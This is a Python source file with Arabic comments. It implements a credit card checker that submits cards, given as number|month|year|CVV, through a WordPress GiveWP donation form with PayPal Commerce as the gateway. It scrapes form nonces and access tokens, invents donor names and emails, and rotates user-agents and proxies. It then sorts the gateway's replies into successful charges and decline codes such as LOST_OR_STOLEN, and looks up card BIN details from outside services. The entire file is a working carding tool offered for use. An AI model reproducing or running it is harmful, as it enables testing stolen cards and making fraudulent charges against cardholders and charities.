import requests
import re
import random
import time
import base64
from requests_toolbelt.multipart.encoder import MultipartEncoder
from urllib.parse import urlparse

# قائمة ثابتة من User-Agents الشائعة (بديل عن fake_useragent)
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
]

def _build_proxy_dict(proxy):
    """يحول صيغة البروكسي إلى dict مناسب لـ requests.Session.proxies"""
    if not proxy:
        return None
    p = proxy.strip()
    if p.startswith("http://") or p.startswith("https://"):
        return {"http": p, "https": p}
    if "@" in p:
        return {"http": f"http://{p}", "https": f"http://{p}"}
    parts = p.split(":")
    if len(parts) == 4:
        host, port, user, pwd = parts
        url = f"http://{user}:{pwd}@{host}:{port}"
        return {"http": url, "https": url}
    if len(parts) == 2:
        return {"http": f"http://{p}", "https": f"http://{p}"}
    return None


class PayPal:
    def __init__(self, url, amount="1.00", proxy=None):
        self.first_name = ["James", "John", "Robert", "Michael", "William", "David", "Richard", "Joseph", "Thomas", "Charles"]
        self.last_name = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez"]
        parsed = urlparse(url)
        self.url = parsed.netloc
        self.inurl = parsed.path
        self.paypal = "b220b06032291ef03c4bd21a74cab3ad"
        self.donation = amount
        self.email = f"{random.choice(self.first_name)}{random.choice(self.last_name)}{random.randint(100,999)}@gmail.com"
        self.r = requests.Session()
        self.ua = random.choice(USER_AGENTS)
        proxy_dict = _build_proxy_dict(proxy)
        if proxy_dict:
            self.r.proxies.update(proxy_dict)

    def Key(self):
        he1 = {'upgrade-insecure-requests': '1', 'user-agent': self.ua}
        r1 = self.r.get(f'https://{self.url}{self.inurl}', headers=he1)
        self.id_form1 = re.search(r'name="give-form-id-prefix" value="(.*?)"', r1.text).group(1)
        self.id_form2 = re.search(r'name="give-form-id" value="(.*?)"', r1.text).group(1)
        self.nonec = re.search(r'name="give-form-hash" value="(.*?)"', r1.text).group(1)
        enc = re.search(r'"data-client-token":"(.*?)"', r1.text).group(1)
        dec = base64.b64decode(enc).decode('utf-8')
        self.au = re.search(r'"accessToken":"(.*?)"', dec).group(1)
        return self.au, self.id_form1, self.id_form2, self.nonec

    def Krs(self, ccx):
        ccx = ccx.strip()
        n = ccx.split("|")[0]
        mm = ccx.split("|")[1]
        yy = ccx.split("|")[2]
        cvc = ccx.split("|")[3].strip()
        if "20" in yy:
            yy = yy.split("20")[1]

        he2 = {'user-agent': self.ua, 'x-requested-with': 'XMLHttpRequest'}
        da1 = {
            'give-honeypot': '',
            'give-form-id-prefix': self.id_form1,
            'give-form-id': self.id_form2,
            'give-form-title': 'Make a One-off Donation',
            'give-current-url': f'https://{self.url}{self.inurl}',
            'give-form-url': f'https://{self.url}{self.inurl}',
            'give-form-minimum': self.donation,
            'give-form-maximum': '50000',
            'give-form-hash': self.nonec,
            'give-price-id': 'custom',
            'give-recurring-logged-in-only': '',
            'give-logged-in-only': self.donation,
            'give_recurring_donation_details': '{"is_recurring":false}',
            'give-amount': self.donation,
            'give_stripe_payment_method': '',
            'payment-mode': 'paypal-commerce',
            'give_first': random.choice(self.first_name),
            'give_last': random.choice(self.last_name),
            'give_email': self.email,
            'card_name': 'msms',
            'card_exp_month': '',
            'card_exp_year': '',
            'give_gift_check_is_billing_address': 'no',
            'give_gift_aid_address_option': 'billing_address',
            'give_gift_aid_card_first_name': '',
            'give_gift_aid_card_last_name': '',
            'give_gift_aid_billing_country': 'GB',
            'give_gift_aid_card_address': '',
            'give_gift_aid_card_address_2': '',
            'give_gift_aid_card_city': '',
            'give_gift_aid_card_state': '',
            'give_gift_aid_card_zip': '',
            'give_action': 'purchase',
            'give-gateway': 'paypal-commerce',
            'action': 'give_process_donation',
            'give_ajax': 'true',
        }
        self.r.post(f'https://{self.url}/wp-admin/admin-ajax.php', headers=he2, data=da1)

        da2 = MultipartEncoder({
            'give-honeypot': (None, ''),
            'give-form-id-prefix': (None, self.id_form1),
            'give-form-id': (None, self.id_form2),
            'give-form-title': (None, 'Make a One-off Donation'),
            'give-current-url': (None, f'https://{self.url}{self.inurl}'),
            'give-form-url': (None, f'https://{self.url}{self.inurl}'),
            'give-form-minimum': (None, self.donation),
            'give-form-maximum': (None, '50000'),
            'give-form-hash': (None, self.nonec),
            'give-price-id': (None, 'custom'),
            'give-recurring-logged-in-only': (None, ''),
            'give-logged-in-only': (None, self.donation),
            'give_recurring_donation_details': (None, '{"is_recurring":false}'),
            'give-amount': (None, self.donation),
            'give_stripe_payment_method': (None, ''),
            'payment-mode': (None, 'paypal-commerce'),
            'give_first': (None, random.choice(self.first_name)),
            'give_last': (None, random.choice(self.last_name)),
            'give_email': (None, self.email),
            'card_name': (None, 'ali'),
            'card_exp_month': (None, ''),
            'card_exp_year': (None, ''),
            'give_gift_check_is_billing_address': (None, 'no'),
            'give_gift_aid_address_option': (None, 'billing_address'),
            'give_gift_aid_card_first_name': (None, ''),
            'give_gift_aid_card_last_name': (None, ''),
            'give_gift_aid_billing_country': (None, 'GB'),
            'give_gift_aid_card_address': (None, ''),
            'give_gift_aid_card_address_2': (None, ''),
            'give_gift_aid_card_city': (None, ''),
            'give_gift_aid_card_state': (None, ''),
            'give_gift_aid_card_zip': (None, ''),
            'give-gateway': (None, 'paypal-commerce'),
        })
        he3 = {'accept': '*/*', 'content-type': da2.content_type, 'user-agent': self.ua}
        pa1 = {'action': 'give_paypal_commerce_create_order'}
        r3 = self.r.post(f'https://{self.url}/wp-admin/admin-ajax.php', params=pa1, headers=he3, data=da2).json()['data']['id']

        he4 = {
            'authority': 'cors.api.paypal.com',
            'accept': '*/*',
            'authorization': f'Bearer {self.au}',
            'braintree-sdk-version': '3.32.0-payments-sdk-dev',
            'paypal-client-metadata-id': self.paypal,
            'user-agent': self.ua,
        }
        da3 = {
            'payment_source': {
                'card': {
                    'number': n,
                    'expiry': f'20{yy}-{mm}',
                    'security_code': cvc,
                    'attributes': {'verification': {'method': 'SCA_WHEN_REQUIRED'}}
                }
            },
            'application_context': {'vault': False}
        }
        self.r.post(f'https://cors.api.paypal.com/v2/checkout/orders/{r3}/confirm-payment-source', headers=he4, json=da3)

        da4 = MultipartEncoder({
            'give-honeypot': (None, ''),
            'give-form-id-prefix': (None, self.id_form1),
            'give-form-id': (None, self.id_form2),
            'give-form-title': (None, 'Make a One-off Donation'),
            'give-current-url': (None, f'https://{self.url}{self.inurl}'),
            'give-form-url': (None, f'https://{self.url}{self.inurl}'),
            'give-form-minimum': (None, self.donation),
            'give-form-maximum': (None, '50000'),
            'give-form-hash': (None, self.nonec),
            'give-price-id': (None, 'custom'),
            'give-recurring-logged-in-only': (None, ''),
            'give-logged-in-only': (None, self.donation),
            'give_recurring_donation_details': (None, '{"is_recurring":false}'),
            'give-amount': (None, self.donation),
            'give_stripe_payment_method': (None, ''),
            'payment-mode': (None, 'paypal-commerce'),
            'give_first': (None, random.choice(self.first_name)),
            'give_last': (None, random.choice(self.last_name)),
            'give_email': (None, self.email),
            'card_name': (None, 'ali'),
            'card_exp_month': (None, ''),
            'card_exp_year': (None, ''),
            'give_gift_check_is_billing_address': (None, 'no'),
            'give_gift_aid_address_option': (None, 'billing_address'),
            'give_gift_aid_card_first_name': (None, ''),
            'give_gift_aid_card_last_name': (None, ''),
            'give_gift_aid_billing_country': (None, 'GB'),
            'give_gift_aid_card_address': (None, ''),
            'give_gift_aid_card_address_2': (None, ''),
            'give_gift_aid_card_city': (None, ''),
            'give_gift_aid_card_state': (None, ''),
            'give_gift_aid_card_zip': (None, ''),
            'give-gateway': (None, 'paypal-commerce'),
        })
        he5 = {'accept': '*/*', 'content-type': da4.content_type, 'user-agent': self.ua}
        pa2 = {'action': 'give_paypal_commerce_approve_order', 'order': r3}
        r5 = self.r.post(f'https://{self.url}/wp-admin/admin-ajax.php', params=pa2, headers=he5, data=da4)

        text = r5.text
        if 'true' in text or 'sucsess' in text:
            return 'CHARGE'
        elif 'DO_NOT_HONOR' in text:
            return "DO_NOT_HONOR"
        elif 'ACCOUNT_CLOSED' in text:
            return "ACCOUNT_CLOSED"
        elif 'PAYER_ACCOUNT_LOCKED_OR_CLOSED' in text:
            return "PAYER_ACCOUNT_LOCKED_OR_CLOSED"
        elif 'LOST_OR_STOLEN' in text:
            return "LOST_OR_STOLEN"
        elif 'CVV2_FAILURE' in text:
            return "CVV2_FAILURE"
        elif 'SUSPECTED_FRAUD' in text:
            return "SUSPECTED_FRAUD"
        elif 'INVALID_ACCOUNT' in text:
            return "INVALID_ACCOUNT"
        elif 'REATTEMPT_NOT_PERMITTED' in text:
            return "REATTEMPT_NOT_PERMITTED"
        elif 'ACCOUNT_BLOCKED_BY_ISSUER' in text:
            return "ACCOUNT_BLOCKED_BY_ISSUER"
        elif 'ORDER_NOT_APPROVED' in text:
            return "ORDER_NOT_APPROVED"
        elif 'PICKUP_CARD_SPECIAL_CONDITIONS' in text:
            return "PICKUP_CARD_SPECIAL_CONDITIONS"
        elif 'PAYER_CANNOT_PAY' in text:
            return "PAYER_CANNOT_PAY"
        elif 'INSUFFICIENT_FUNDS' in text:
            return "INSUFFICIENT_FUNDS"
        elif 'GENERIC_DECLINE' in text:
            return "GENERIC_DECLINE"
        elif 'COMPLIANCE_VIOLATION' in text:
            return "COMPLIANCE_VIOLATION"
        elif 'TRANSACTION_NOT_PERMITTED' in text:
            return "TRANSACTION_NOT_PERMITTED"
        elif 'PAYMENT_DENIED' in text:
            return "PAYMENT_DENIED"
        elif 'INVALID_TRANSACTION' in text:
            return "INVALID_TRANSACTION"
        elif 'RESTRICTED_OR_INACTIVE_ACCOUNT' in text:
            return "RESTRICTED_OR_INACTIVE_ACCOUNT"
        elif 'SECURITY_VIOLATION' in text:
            return "SECURITY_VIOLATION"
        elif 'DECLINED_DUE_TO_UPDATED_ACCOUNT' in text:
            return "DECLINED_DUE_TO_UPDATED_ACCOUNT"
        elif 'INVALID_OR_RESTRICTED_CARD' in text:
            return "INVALID_OR_RESTRICTED_CARD"
        elif 'EXPIRED_CARD' in text:
            return "EXPIRED_CARD"
        elif 'CRYPTOGRAPHIC_FAILURE' in text:
            return "CRYPTOGRAPHIC_FAILURE"
        elif 'TRANSACTION_CANNOT_BE_COMPLETED' in text:
            return "TRANSACTION_CANNOT_BE_COMPLETED"
        elif 'DECLINED_PLEASE_RETRY' in text:
            return "DECLINED_PLEASE_RETRY_LATER"
        elif 'TX_ATTEMPTS_EXCEED_LIMIT' in text:
            return "TX_ATTEMPTS_EXCEED_LIMIT"
        else:
            try:
                return r5.json()['data']['error']
            except:
                return "UNKNOWN_ERROR"

def pp_check(cc, amount="1.00", base_url=None, proxy=None):
    if not base_url:
        return "Error: No gateway URL provided"
    pp = PayPal(base_url, str(amount), proxy=proxy)
    try:
        pp.Key()
    except Exception as e:
        return f"Dead: {e}"
    try:
        result = pp.Krs(cc)
    except Exception as e:
        return f"Error: {e}"
    return result

def get_bin(cc):
    try:
        d = requests.get(f"https://bins.antipublic.cc/bins/{cc[:6]}", timeout=5).json()
        return (d.get("bank","?"), d.get("country_name","?"),
                d.get("country_flag","🌍"), d.get("brand","?"), d.get("type","?"))
    except:
        pass
    try:
        d = requests.get(f"https://data.handyapi.com/bin/{cc[:6]}", timeout=8).json()
        if d.get("Status") == "SUCCESS":
            code = d.get("Country",{}).get("A2","")
            flag = "".join(chr(127397+ord(c)) for c in code.upper()) if code else "🌍"
            return (d.get("Issuer","?"), d.get("Country",{}).get("Name","?"),
                    flag, d.get("Scheme","?"), d.get("Type","?"))
    except:
        pass
    return "?", "?", "🌍", "?", "?"